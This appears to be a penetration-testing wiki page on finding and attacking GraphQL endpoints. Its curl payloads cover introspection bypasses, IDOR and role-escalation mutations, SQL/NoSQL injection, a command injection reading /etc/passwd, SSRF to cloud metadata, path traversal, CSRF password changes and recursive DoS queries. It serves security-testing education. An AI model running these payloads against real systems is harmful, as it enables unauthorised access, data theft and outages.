---
authors: ShutdownRepo, felixbillieres
category: web
---

# GraphQL

## Theory

GraphQL provides a query language and runtime for APIs, allowing clients to request exactly the data they need through a single endpoint. Unlike REST APIs, GraphQL enables flexible data fetching through schemas, queries, mutations, and resolvers.

During web assessments, GraphQL implementations frequently expose schema information through introspection, authorization flaws (BOLA/IDOR), input handling issues, and DoS vectors.

### How GraphQL works

GraphQL operates through:
- **Schema**: Defines available types, queries, and mutations
- **Queries**: Read operations to fetch data
- **Mutations**: Write operations to modify data
- **Resolvers**: Functions that populate data for each field
- **Introspection**: Built-in capability to query the schema itself

### Common security issues

- **Information disclosure**: Introspection enabled in production
- **Authorization bypass**: BOLA/IDOR on object access, over-privileged queries
- **Injection attacks**: Unsanitized resolver inputs (SQL, NoSQL, command injection)
- **DoS vectors**: Complex nested queries, unbounded operations
- **CSRF**: State-changing operations via GET requests or alternative content-types
- **Rate limiting bypass**: Using aliases to send multiple operations in one request

## Practice

### Finding GraphQL endpoints

GraphQL endpoints are commonly found at predictable paths:

- `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`
- `/api`, `/graphql/api`

#### Universal queries

The query `{"query":"query{__typename}"}` can be sent to any suspected endpoint. GraphQL services will respond with `{"data": {"__typename": "Query"}}`.

#### Request methods

Different HTTP methods and content-types should be tested:

::: tabs

=== Burp Suite

**POST with JSON:**
```http
POST /graphql HTTP/1.1
Host: $TARGET
Content-Type: application/json

{"query":"query{__typename}"}
```

**GET with query parameter:**
```http
GET /graphql?query=query{__typename} HTTP/1.1
Host: $TARGET
```

**POST with form data:**
```http
POST /graphql HTTP/1.1
Host: $TARGET
Content-Type: application/x-www-form-urlencoded

query=query{__typename}
```

=== curl

```bash
# POST with JSON
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__typename}"}'

# GET with query parameter
curl "http://$TARGET/graphql?query=query{__typename}"

# POST with form data
curl -sS "http://$TARGET/graphql" \
  -d "query=query{__typename}"
```

:::

> [!NOTE]
> GraphQL services often respond to invalid requests with "query not present" or similar errors, which can help confirm the endpoint.

### Schema mapping

#### Introspection

When introspection is enabled, the schema can be queried to understand available operations.

**Basic schema query:**
```bash
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{queryType{name} mutationType{name}}}"}'
```

**Full introspection query:**

The standard GraphQL introspection query can be generated with GraphQL libraries or found in the [official documentation](https://graphql.org/learn/introspection/).

#### When introspection is disabled

Several bypass techniques can be attempted:

**Special character insertion:**
```bash
# Newline after __schema
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema\n{queryType{name}}}"}'

# Space after __schema
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema {queryType{name}}}"}'
```

**Alternative methods:**
```bash
# GET request
curl "http://$TARGET/graphql?query=query{__schema{queryType{name}}}"

# POST with form data
curl -sS "http://$TARGET/graphql" \
  -d "query=query{__schema{queryType{name}}}"
```

**Error-based discovery:**
```bash
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{invalidField}"}'
```

> [!TIP]
> Error messages from invalid queries often leak type names and field names, enabling incremental schema reconstruction even without introspection.

#### Automated tools

::: tabs

=== InQL (Burp)

[InQL](https://github.com/doyensec/inql) can be installed from Burp's BApp Store to perform introspection on GraphQL requests.

=== GraphQLmap

[GraphQLmap](https://github.com/swisskyrepo/GraphQLmap) (Python) can be used for CLI-based GraphQL security testing.

```bash
python3 graphqlmap.py -u "http://$TARGET/graphql" -i
```

=== GraphQL Cop

[GraphQL Cop](https://github.com/dolevf/GraphQL-Cop) (Python) can be used to audit GraphQL endpoints for common security misconfigurations.

```bash
python3 graphql-cop.py -t "http://$TARGET/graphql"
```

:::

### High-signal testing

#### BOLA/IDOR on object access

Direct object access can be tested by manipulating IDs:

```bash
# Basic IDOR test
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"123\"){id name email}}"}'

# Access with different user ID
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"456\"){id name email role}}"}'

# Admin access attempt
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"1\"){id name email isAdmin}}"}'
```

#### Over-fetching and hidden fields

Fields not exposed in the UI can be requested directly:

```bash
# Sensitive user fields
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"123\"){id name email role isAdmin internalNotes permissions}}"}'

# Admin-only data access
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{users{edges{node{id name email role lastLogin apiKey}}}}"}'
```

#### Mutations and authorization

Privilege escalation can be attempted through mutations:

```bash
# Update another user's role
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(input:{id:\"456\", role:\"ADMIN\"}){user{id role}}}"}'

# Ownership transfer
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{transferOwnership(resourceId:\"789\", newOwnerId:\"123\"){success}}"}'
```

#### Unsanitized arguments

Resolver inputs should be tested for injection vulnerabilities.

**SQL/NoSQL injection:**
```bash
# Basic SQL injection in filter
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"query{users(filter:\\\"name' OR 1=1 --\\\"){id name}}\"}"

# NoSQL injection
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{users(filter:\"{\\\"username\\\": {\\\"$ne\\\": null}}\" ){id name}}"}'
```

**Command injection:**
```bash
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{execute(cmd:\"ls; cat /etc/passwd\"){output}}"}'
```

**SSRF:**
```bash
# SSRF via URL parameters
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{webhook(url:\"http://169.254.169.254/latest/meta-data/\"){success}}"}'

# Internal network access
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{webhook(url:\"http://internal.admin:8080/reset\"){success}}"}'
```

**Path traversal:**
```bash
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadFile(path:\"../../../etc/passwd\"){success}}"}'
```

#### Bypassing rate limiting with aliases

Aliases allow sending multiple operations in a single request, which can bypass per-request rate limiting:

```bash
# Brute force discount codes via aliases
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{check1:checkDiscount(code:\"CODE1\"){valid} check2:checkDiscount(code:\"CODE2\"){valid} check3:checkDiscount(code:\"CODE3\"){valid}}"}'
```

#### GraphQL CSRF

CSRF is possible when the endpoint accepts alternative content-types without proper token validation:

```bash
# GET-based CSRF
curl "http://$TARGET/graphql?query=mutation{changePassword(newPassword:\"hacked\"){success}}"

# Form-based CSRF
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=mutation{changePassword(newPassword:\"hacked\"){success}}"
```

#### DoS primitives

Unbounded operations can be exploited for denial of service.

> [!CAUTION]
> DoS payloads should be carefully controlled to avoid overwhelming production backends.

**Deep recursion:**
```bash
# Circular fragment references
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:\"1\"){...UserFragment}} fragment UserFragment on User{friends{...UserFragment}}"}'
```

**Large result sets:**
```bash
# Unbounded pagination
curl -sS "http://$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query{users(first:1000000){edges{node{id name email}}}}"}'
```

## Resources

[InQL — Burp extension for schema mapping and query generation](https://github.com/doyensec/inql)

[GraphQLmap — CLI GraphQL security testing](https://github.com/swisskyrepo/GraphQLmap)

[GraphQL Cop — GraphQL security auditing](https://github.com/dolevf/GraphQL-Cop)

[Graphw00f — GraphQL implementation fingerprinting](https://github.com/dolevf/graphw00f)

[Clairvoyance — GraphQL schema discovery when introspection is disabled](https://github.com/nikitastupin/clairvoyance)

[PayloadsAllTheThings — GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

[OWASP GraphQL Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-API_Testing/01-Testing_GraphQL)

[PortSwigger GraphQL Academy](https://portswigger.net/web-security/graphql)

[GraphQL Introspection — Official documentation](https://graphql.org/learn/introspection/)
